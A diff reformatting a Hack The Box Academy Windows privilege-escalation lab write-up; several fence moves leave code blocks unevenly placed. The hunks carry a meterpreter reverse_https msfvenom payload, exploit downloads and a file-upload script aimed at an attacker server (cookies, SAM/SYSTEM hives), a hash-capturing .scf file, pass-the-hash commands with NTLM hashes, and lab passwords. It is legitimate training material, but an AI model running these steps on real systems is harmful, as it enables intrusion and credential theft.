@@ -80,8 +80,8 @@ This module provides a battle-tested roadmap for Windows local privilege escalat
 
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 
 Getting the Lay of the Land
 Situational Awareness:
@@ -329,9 +329,9 @@ the necessary modules for it to work.
 So, on the pwnbox, first lets make a new directory called 'mssqlclient1', then
 ```bash
 run 'ls' to confirm directory creation:
-```
 mkdir mssqlclient1
 ```bash
+```
 ls | grep mssqlclient1
 ```
 
@@ -353,9 +353,9 @@ created directory:
 *note, to differentiate the existing built in 'mssqlclient' to the 'mssqlclient' we
 just downloaded, I called it 'mssqlclient1.py'. *
 After the download, run the commands:
-```bash
 cd mssqlclient1
 ```
+```bash
 ls
 to move to our created directory, and confirm download:
 
@@ -646,9 +646,9 @@ There is some information, but the owner value is missing (probably due to lack
 of permission). Lets try to get some information on the parent folder, we will
 ```bash
 use the command:
-```
 cmd /c dir /q 'C:\TakeOwn'
 (run cmd from powershell, and with '\q' – look for the folder owners
+```
 
 The owner of the directory is 'sccm_svc'.
 
@@ -1416,7 +1416,7 @@ Administrator NTLM hash.
 Can we use it to smb login to the machine via 'pass the hash' technique and get
 the flag:
 On the pwnbox, run the command:
-smbclient.py INLANEFREIGHT/administrator@<target-IP> -hashes
+smbclient.py INLANEFREIGHT/administrator@`<target-IP>` -hashes
 :7796ee39fd3a9c3a1844556115ae1a54
 using smbclient tool to smb connect to the target machine, using the
 Administrator's NTLM hash captured with the 'HiveKnightmare'.
@@ -1468,7 +1468,7 @@ We will use the exploit to write to the service 'maintenanceservice'.
 #### Technical Methodology & Exploit Execution:
 
 msfvenom -p windows/x64/meterpreter/reverse_https
-LHOST=<attacker-IP> LPORT=4444 -f exe >
+LHOST=`<attacker-IP>` LPORT=4444 -f exe >
 maintenanceservice.exe
 *port value is already built-in for '4444'. *
 When done, we will confirm generation with 'ls' command:
@@ -1493,13 +1493,13 @@ We will download 2 copies of the file (section instructions, and I tried the
 method without it (one copy for both purposes – didn't work)):
 ```bash
 iwr -uri http://10.10.15.241:8080/maintenanceservice.exe -
-```
 outfile maintenanceservice.exe
+```
 
 ```bash
 iwr -uri http://10.10.15.241:8080/maintenanceservice.exe -
-```
 outfile maintenanceservice2.exe
+```
 
 at the end of the transfer, we ls on the windows target machine to confirm exe
 existence:
@@ -1637,9 +1637,8 @@ for absolute certainty:
 *
 Ok, lets logout from the user ('shutdown /l'), and rdp using jonsnow credentials
 ```bash
-xfreerdp /v:<Target-IP> /u:jonsnow /p:yigrette /dynamic-
+xfreerdp /v:<Target-IP> /u:jonsnow /p:yigrette /dynamic-resolution
 ```
-resolution
 
 ![Figure 53.1 — Lab execution and output verification (Page 53)](/assets/images/posts/htb-academy/windows-privilege-escalation/p053_01.jpg)
 *_Figure 53.1 — Lab execution and output verification (Page 53)_*
@@ -1897,7 +1896,7 @@ We can locate the passwords within 'Microsoft StickyNotes, which – from the
 section:
 'People often use the StickyNotes app on Windows workstations to save passwords and
 other information, not realizing it is a database file. This file is located
-at C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Local
+at C:\Users\`<user>`\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Local
 State\plum.sqlite and is always worth searching for and examining.'
 
 Method 2: within 'C:\Tools' there is a folder of 'PSSQLite', a collection of tools
@@ -1913,8 +1912,8 @@ that can be used to extract data from StickyNotes application:
 We will use the tool 'PSSQLite.psd1' – lets open powershell in that path, and
 ```bash
 run the sequence of commands:
-```
 Set-ExecutionPolicy Bypass -Scope Process
+```
 Select 'A' for 'Yes to all' prompt (ignore the red note below):
 
 Then:
@@ -2064,7 +2063,7 @@ weird Linux machine:
 We go to application → Web Browser
 
 Fire fox will be opened, in there -  we will go to the URL:
-http://humongousretail.com/remote/
+`http://humongousretail.com/remote/`
 
 ![Figure 67.1 — Lab execution and output verification (Page 67)](/assets/images/posts/htb-academy/windows-privilege-escalation/p067_01.jpg)
 *_Figure 67.1 — Lab execution and output verification (Page 67)_*
@@ -2218,8 +2217,8 @@ path '/home/htb-student/.local/bin/' we have smbserver.py.
 So, on ACA, on '~/Tools' – run the command:
 ```bash
 sudo /home/htb-student/.local/bin/smbserver.py -smb2support
-```
 share $(pwd)
+```
 we will also need the 'ACA' IP , it can be obtain with 'ifconfig'.
 Ok lets run the smb server:
 
@@ -2380,7 +2379,7 @@ path, we will take our user's documents folder.
 First we will create it as txt file (lets call it test.txt), and put in it the script:
 [Shell]
 Command=2
-IconFile=\\<attacker-IP>\share\legit.ico
+IconFile=\\`<attacker-IP>`\share\legit.ico
 [Taskbar]
 Command=ToggleDesktop
 
@@ -2518,9 +2517,9 @@ the pwnbox attacking maching, unzip it, and get the python script in it.
 On terminal, we run the command:
 ```bash
 python3 mremoteng_decrypt.py -s
-```
 "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLT
 z0aSNjRjr3Rilf6Xb4XQ="
+```
 
 ![Figure 83.1 — Lab execution and output verification (Page 83)](/assets/images/posts/htb-academy/windows-privilege-escalation/p083_01.jpg)
 *_Figure 83.1 — Lab execution and output verification (Page 83)_*
@@ -2693,8 +2692,8 @@ continuing from where we left off, we have the password for 'restic'
 backup services in 'E:\restic', lets put it as enviorement variable with the
 ```bash
 powershell command:
-```
 $env:RESTIC_PASSWORD = 'Superbackup!'
+```
 
 
 With this, every 'restic' operation we make on 'E:\restic' shall be accepted
@@ -2771,10 +2770,10 @@ target machine to the attacker pwnbox.
 We will use the same crude python server in the pwnbox and the same
 ```bash
 PowerShell upload script on the target machine we used to upload Graces's
-```
 cookies from the target machine to the attacking pwnbox machine:
-$filePath = ".\<target-File>"
+$filePath = ".\`<target-File>`"
 $targetUrl = "http://10.10.15.241:8080/upload"
+```
 
 # Create a WebClient object
 $webClient = New-Object System.Net.WebClient
@@ -2823,8 +2822,8 @@ we will use pash the hash with the tool 'evil-winrm' targeting the
 'WinRM' (windows remote management) service (port 5985):
 ```bash
 evil-winrm -i <target-IP> -u administrator -H
-```
 bac9dc5b7b4bec1d83e0e9c04b477f26
+```
 we will login and enter 'whoami' to establish proof of concept.
 
 ![Figure 93.1 — Lab execution and output verification (Page 93)](/assets/images/posts/htb-academy/windows-privilege-escalation/p093_01.jpg)
@@ -2871,8 +2870,8 @@ newer TLS versions required for the RDP connection, we will have to perform a
 slight modification to the RDP connection command:
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password> /sec:rdp
-```
 /dynamic-resolution
+```
 the '/sec:rdp' means we run the conection with more basic RDP connection
 rather than more advanced TLS – while being less secure, it is more compatible
 to older windows (like windows server 2008:
@@ -3190,7 +3189,7 @@ and -p- means to scan all ports. *
 Ok so our target is, as expected – a windows machine. we have RDP service on,
 and http as well.
 As the RDP requires credentials, lets try inspecting the http:
-Lets open the browser and enter 'http://<target-IP>/':
+Lets open the browser and enter 'http://`<target-IP>`/':
 
 ![Figure 106.1 — Lab execution and output verification (Page 106)](/assets/images/posts/htb-academy/windows-privilege-escalation/p106_01.jpg)
 *_Figure 106.1 — Lab execution and output verification (Page 106)_*
@@ -3636,9 +3635,9 @@ python -m http.server 8080
 
 ```bash
 iwr -uri
-```
 http://10.10.15.241:8080/BitsArbitraryFileMoveExploit.exe -
 outfile BitsArbitraryFileMoveExploit.exe
+```
 
 confirm download on target's machine:
 
@@ -3785,7 +3784,7 @@ reg save HKLM\SYSTEM C:\Tools\SYSTEM
 python server.py
 ```
 and for upload, on the target machine we run the powershell upload script 3
-times replacing the <target-file> with SAM,SYSTEM,SECURITY .
+times replacing the `<target-file>` with SAM,SYSTEM,SECURITY .
 
 Lets confirm upload to the attacking pwnbox for offline cracking:
 
